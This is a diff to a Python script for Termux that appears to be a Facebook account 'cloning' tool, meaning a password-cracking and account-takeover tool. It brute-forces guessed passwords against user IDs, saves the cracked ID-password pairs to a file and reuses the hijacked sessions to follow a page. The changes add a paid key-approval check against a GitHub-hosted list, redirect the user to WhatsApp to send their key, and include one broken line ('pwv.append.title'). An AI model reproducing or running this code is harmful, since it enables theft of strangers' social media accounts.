@@ -3,7 +3,6 @@ R = '\033[91;1m'
 G = '\033[92;1m'
 Y = '\033[93;1m'
 B = '\033[94;1m'
-P = '\033[95;1m'
 C = '\033[96;1m'
 N = '\x1b[0m'
 import os
@@ -292,7 +291,7 @@ def name2():
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
-					pwv.append(nmf)
+					pwv.append.title(nmf)
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -369,7 +368,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [KHD-302 OK] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/KHD-302 OK','a').write('%s\n' % wrt)
+				open('/sdcard/KHD-302 OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
@@ -420,8 +419,7 @@ class Main:
 		print("")
 		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
 		print("\033[1;37mNOTE : FOR APROVAL LIKE FB PAGE ")
-		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
-		
+		print("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")	
 		
 		print("")
 		print("\033[1;37m [1] FIRST LIKE PAGE   ")
@@ -489,7 +487,7 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m   WELCOME TO FB CLONING WORLD")
+				print("\033[0;94m----------------------------------------------")
 				print("\n\033[0;94m [+] START CLONING")
 				print(" \033[0;96m[+] NOTE: CP IDZ OPEN IN 15 DAYS")
 				print(" [!] ~Use Flight Mode 5 Second After Every 10 mint~")
@@ -920,7 +918,7 @@ class Main:
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
-				print("     \033[0;93m   WELCOME TO FB CLONING WORLD")
+				print("\033[0;94m--------------------------------------------")
 				print("\n\033[0;94m [+] STARTING CLONING")
 				print(" \033[0;96m[+] NOTE: CP IDZ OPEN IN 15 DAYS")
 				print(" [!] ~Use Flight Mode 5 Second After Every 10 mint~")
@@ -1338,3 +1336,36 @@ if len(sys.argv) == 2:
  
 try:Main()
 except Exception as e:exit(str(e))
+def Subscraption():
+	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
+	clear()
+	print(logo)
+	r1=requests.get("https://raw.githubusercontent.com/khdfounder/khdxrsu/main/aproval.txt").text
+	if key1 in r1:
+		os.system('clear')
+		print(logo)
+		Main()
+	else:
+		os.system("clear")
+		print(logo)
+		print("\t \033[1;32m First Get Approvel\033[1;37m ")
+		time.sleep(1)
+		os.system("clear")
+		print(logo)
+		print ("")
+		print(" \033[1;32m AHAD Toll Paid You Need Get Approved First\033[1;37m\n")
+		print ("")
+		print(" Your Key is Not Approved ")
+		print("")
+		print(" Copy And Send Key To Admin")
+		print ("")
+		print (" Your Key : "+ak+KHD302+key1)
+		print ("")
+		name = input(" Your Name : ")
+		print ("")
+		input(" Press Enter To Send Key")
+		time.sleep(3.5)
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
+		os.system('am start https://wa.me/+923185778830?text=' + tks)
+		Subscraption()        
+Main()
